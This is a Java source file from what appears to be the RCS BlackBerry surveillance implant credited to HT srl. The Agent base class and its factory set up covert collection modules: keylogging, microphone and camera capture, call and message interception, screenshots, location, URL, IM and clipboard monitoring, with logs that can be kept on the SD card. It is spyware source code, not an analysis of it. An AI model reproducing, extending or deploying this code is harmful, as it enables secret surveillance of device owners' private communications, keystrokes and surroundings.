/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Agent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.Status;
import blackberry.log.Log;
import blackberry.log.LogCollector;
import blackberry.threadpool.TimerJob;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public abstract class Agent extends TimerJob {
    //#debug
    private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);

    public static final int AGENT = 0x1000;
    public static final int AGENT_MESSAGE = AGENT + 0x1;
    public static final int AGENT_TASK = AGENT + 0x2;
    public static final int AGENT_CALLLIST = AGENT + 0x3;
    public static final int AGENT_DEVICE = AGENT + 0x4;
    public static final int AGENT_POSITION = AGENT + 0x5;
    public static final int AGENT_CALL = AGENT + 0x6;
    public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
    public static final int AGENT_KEYLOG = AGENT + 0x8;
    public static final int AGENT_SNAPSHOT = AGENT + 0x9;
    public static final int AGENT_URL = AGENT + 0xa;
    public static final int AGENT_IM = AGENT + 0xb;
    // public static final int AGENT_EMAIL = AGENT + 0xc;
    public static final int AGENT_MIC = AGENT + 0xd;
    public static final int AGENT_CAM = AGENT + 0xe;
    public static final int AGENT_CLIPBOARD = AGENT + 0xf;
    public static final int AGENT_CRISIS = AGENT + 0x10;
    public static final int AGENT_APPLICATION = AGENT + 0x11;
    public static final int AGENT_PDA = 0xDF7A;

    public static Agent factory(int agentId, boolean agentStatus,
            byte[] confParams) {
        switch (agentId) {
        case AGENT_MESSAGE:
            // #debug
            debug.trace("Factory AGENT_MESSAGE");
            return new MessageAgent(agentStatus, confParams);
        case AGENT_TASK:
            // #debug
            debug.trace("Factory AGENT_TASK");
            return new TaskAgent(agentStatus, confParams);
        case AGENT_CALLLIST:
            // #debug
            debug.trace("Factory AGENT_CALLLIST");
            return new CallListAgent(agentStatus, confParams);
        case AGENT_DEVICE:
            // #debug
            debug.trace("Factory AGENT_DEVICE");
            return new DeviceInfoAgent(agentStatus, confParams);
        case AGENT_POSITION:
            // #debug
            debug.trace("Factory AGENT_POSITION");
            return new PositionAgent(agentStatus, confParams);
        case AGENT_CALL:
            // #debug
            debug.trace("Factory AGENT_CALL");
            return new CallAgent(agentStatus, confParams);
        case AGENT_CALL_LOCAL:
            // #debug
            debug.trace("Factory AGENT_CALL_LOCAL");
            return new CallLocalAgent(agentStatus, confParams);
        case AGENT_KEYLOG:
            // #debug
            debug.trace("Factory AGENT_KEYLOG");
            return new KeyLogAgent(agentStatus, confParams);
        case AGENT_SNAPSHOT:
            // #debug
            debug.trace("Factory AGENT_SNAPSHOT");
            return new SnapShotAgent(agentStatus, confParams);
        case AGENT_URL:
            // #debug
            debug.trace("Factory AGENT_URL");
            return new UrlAgent(agentStatus, confParams);
        case AGENT_IM:
            // #debug
            debug.trace("Factory AGENT_IM");
            return new ImAgent(agentStatus, confParams);
        case AGENT_MIC:
            // #debug
            debug.trace("Factory AGENT_MIC");
            return new MicAgent(agentStatus, confParams);
        case AGENT_CAM:
            // #debug
            debug.trace("Factory AGENT_CAM");
            return new CamAgent(agentStatus, confParams);
        case AGENT_CLIPBOARD:
            // #debug
            debug.trace("Factory AGENT_CLIPBOARD");
            return new ClipBoardAgent(agentStatus, confParams);
        case AGENT_CRISIS:
            // #debug
            debug.trace("Factory AGENT_CRISIS");
            return new CrisisAgent(agentStatus, confParams);
        case AGENT_APPLICATION:
            // #debug
            debug.trace("Factory AGENT_APPLICATION");
            return new ApplicationAgent(agentStatus, confParams);
        case AGENT_PDA:
            // #debug
            debug.trace("Factory AGENT_PDA");
            return new PdaAgent(agentStatus, confParams);

        default:
            // #debug
            debug.trace("AgentId UNKNOWN: " + agentId);
            return null;
        }
    }

    Status status;

    LogCollector logCollector;

    boolean logOnSD;
    public int agentId;

    // public int agentStatus;

    // public int command;

    protected Log log;

    protected Agent(int agentId_, boolean agentEnabled, boolean logOnSD_,
            String name) {
        super(name);
        status = Status.getInstance();
        logCollector = LogCollector.getInstance();

        this.agentId = agentId_;

        this.logOnSD = logOnSD_;
        this.log = logCollector.factory(this, logOnSD_);

        enable(agentEnabled);
    }

    public boolean onSD() {
        return logOnSD;
    }

    protected abstract boolean parse(byte[] confParameters);

    public String toString() {
        return "Agent " + name + "|" + agentId;

    }

}
